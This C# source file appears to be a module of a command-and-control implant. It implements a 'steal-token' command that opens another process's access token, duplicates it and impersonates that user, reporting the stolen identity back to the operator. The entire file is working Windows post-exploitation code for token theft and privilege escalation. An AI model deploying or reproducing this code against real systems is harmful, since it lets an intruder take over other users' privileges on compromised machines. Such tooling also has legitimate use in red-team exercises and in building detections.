using Native = SharedArsenal.Native;
using Knight.Models.Raven;
using System;
using System.Diagnostics;
using System.Security.Principal;

namespace Knight.Commands
{
    public class StealToken : KnightCommand
    {
        public override string Name => "steal-token";

        public override string Execute(TaskMessage task)
        {
            if (!int.TryParse(task.Arguments[0], out int pid))
            {
                return "Failed to parse PID";
            }

            // open handle to process
            var process = Process.GetProcessById(pid);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            try
            {
                // open handl to token
                // may change 2nd arg from TOKEN_ALL_ACCESS to just a specific part, like impersonate
                if (!Native.Advapi.OpenProcessToken(process.Handle, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                {
                    return "Failed to open process token";
                }

                // duplicate token
                var sa = new Native.Advapi.SECURITY_ATTRIBUTES();

                if (!Native.Advapi.DuplicateTokenEx(hToken, Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa, Native.Advapi.SecurityImpersonationLevel.SecurityImpersonation,
                    Native.Advapi.TokenType.TokenImpersonation, out hTokenDup))
                {
                    return "Failed to duplicate token";
                }
                // impersonate token
                if (Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
                {
                    var identity = new WindowsIdentity(hTokenDup);

                    return $"Successfully impersonated {identity.Name}";
                }
            }
            catch
            {

            }
            finally
            {
                if (hToken != IntPtr.Zero)
                {
                    Native.Kernel32.CloseHandle(hToken);
                }

                if (hTokenDup != IntPtr.Zero)
                {
                    Native.Kernel32.CloseHandle(hTokenDup);
                }

                process.Dispose();

            }

            return "Unkown Error lol";
        }
    }
}